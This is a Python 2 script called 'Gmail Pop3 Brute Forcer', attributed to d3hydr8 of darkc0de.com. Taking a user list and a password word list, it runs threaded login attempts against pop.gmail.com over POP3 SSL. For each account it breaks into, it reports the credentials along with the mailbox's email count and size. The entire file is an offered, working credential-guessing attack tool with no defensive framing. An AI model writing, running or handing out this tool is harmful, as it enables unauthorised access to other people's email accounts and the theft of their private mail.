#!usr/bin/python
#Gmail Pop3 Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, poplib
from copy import copy

if len(sys.argv) !=3:
	print "\n\t   d3hydr8[at]gmail[dot]com GmailPopBruteForcer v1.0"
	print "\t   --------------------------------------------------\n"
	print "\t    Usage: ./gmailpopbrute.py <userlist> <wordlist>\n"
	sys.exit(1)
	
server = "pop.gmail.com"
success = []

try:
  	users = open(sys.argv[1], "r").readlines()
except(IOError): 
  	print "[-] Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "[-] Error: Check your wordlist path\n"
  	sys.exit(1)
	
try:
	pop = poplib.POP3_SSL(server, 995)
	welcome = pop.getwelcome()
	pop.quit()
except (poplib.error_proto): 
	welcome = "No Response"
	pass

print "\n\t   d3hydr8[at]gmail[dot]com GmailPopBruteForcer v1.0"
print "\t   --------------------------------------------------\n"
print "[+] Server:",server
print "[+] Port: 995"
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Server response:",welcome,"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "[-] Reloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return value[0], users[0]
	else:
		return value[0], users[0]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		user = user.replace("\n","")
		value = value.replace("\n","")
		
		try:
			print "-"*12
			print "[+] User:",user,"Password:",value
			pop = poplib.POP3_SSL(server, 995)
			pop.user(user)
			pop.pass_(value)
			print "\t\t\n\nLogin successful:",user, value
			print "\t\tMail:",pop.stat()[0],"emails"
			print "\t\tSize:",pop.stat()[1],"bytes\n\n"
			success.append(user)
			success.append(value)
			success.append(pop.stat()[0])
			success.append(pop.stat()[1])
			pop.quit()
		except (poplib.error_proto), msg: 
			#print "An error occurred:", msg
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
if len(success) >=1:
	print "\n\n[+] Login successful:",success[0], success[1]
	print "\t[+] Mail:",success[2],"emails"
	print "\t[+] Size:",success[3],"bytes\n"
print "\n[-] Done"